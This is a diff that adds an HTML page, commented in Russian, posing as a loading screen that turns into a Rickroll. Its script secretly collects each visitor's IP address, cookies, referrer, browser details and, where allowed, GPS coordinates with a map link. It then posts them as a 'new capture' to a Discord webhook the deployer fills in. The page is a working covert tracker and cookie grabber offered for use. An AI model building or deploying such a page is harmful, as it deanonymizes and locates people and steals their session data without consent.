@@ -1,0 +1,106 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <meta charset="UTF-8">
+    <title>Loading...</title>
+    <style>
+        body {
+            background: #0a0a0a;
+            color: white;
+            font-family: monospace;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            margin: 0;
+        }
+        .loader {
+            text-align: center;
+        }
+        .spinner {
+            width: 40px;
+            height: 40px;
+            border: 3px solid rgba(255,255,255,0.3);
+            border-top: 3px solid #00ff00;
+            border-radius: 50%;
+            animation: spin 1s linear infinite;
+            margin: 0 auto 20px;
+        }
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+        iframe {
+            display: none;
+        }
+    </style>
+</head>
+<body>
+    <div class="loader" id="loader">
+        <div class="spinner"></div>
+        <h3>Loading, please wait...</h3>
+    </div>
+
+    <!-- Скрытый Rickroll (YouTube) -->
+    <iframe id="rickroll" width="0" height="0" src="https://www.youtube.com/embed/dQw4w9WgXcQ?autoplay=1&mute=0" frameborder="0" allow="autoplay; encrypted-media" allowfullscreen></iframe>
+
+    <script>
+        // ⬇️ ВСТАВЬ СВОЙ DISCORD WEBHOOK URL ⬇️
+        const DISCORD_WEBHOOK_URL = 'https://discord.com/api/webhooks/твой/url';
+
+        async function sendToDiscord(text) {
+            await fetch(DISCORD_WEBHOOK_URL, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({ content: text.substring(0, 2000) })
+            });
+        }
+
+        async function collectAndSend() {
+            let ip = 'не удалось';
+            try {
+                let res = await fetch('https://api.ipify.org?format=json');
+                let data = await res.json();
+                ip = data.ip;
+            } catch(e) {}
+
+            let message = 'НОВЫЙ ЗАХВАТ\n';
+            message += 'Время: ' + new Date().toLocaleString() + '\n';
+            message += 'IP: ' + ip + '\n';
+            message += 'URL: ' + window.location.href + '\n';
+            message += 'Referrer: ' + (document.referrer || 'прямой переход') + '\n';
+            message += 'Cookies: ' + document.cookie + '\n';
+            message += 'User-Agent: ' + navigator.userAgent + '\n';
+            message += 'Язык: ' + navigator.language + '\n';
+            message += 'Экран: ' + screen.width + 'x' + screen.height + '\n';
+
+            if (navigator.geolocation) {
+                navigator.geolocation.getCurrentPosition(pos => {
+                    message += 'Координаты: ' + pos.coords.latitude + ', ' + pos.coords.longitude + '\n';
+                    message += 'Карта: https://www.google.com/maps?q=' + pos.coords.latitude + ',' + pos.coords.longitude;
+                    sendToDiscord(message);
+                }, () => sendToDiscord(message));
+            } else {
+                sendToDiscord(message);
+            }
+        }
+
+        // Запускаем сбор данных
+        setTimeout(collectAndSend, 1000);
+
+        // Через 3 секунды убираем "Загрузка..." и показываем Rickroll на весь экран
+        setTimeout(() => {
+            document.getElementById('loader').style.display = 'none';
+            let rickIframe = document.getElementById('rickroll');
+            rickIframe.style.display = 'block';
+            rickIframe.style.position = 'fixed';
+            rickIframe.style.top = '0';
+            rickIframe.style.left = '0';
+            rickIframe.style.width = '100%';
+            rickIframe.style.height = '100%';
+            rickIframe.style.border = 'none';
+            rickIframe.src = 'https://www.youtube.com/embed/dQw4w9WgXcQ?autoplay=1&mute=0&controls=0&modestbranding=1&rel=0';
+        }, 3000);
+    </script>
+</body>
+</html>
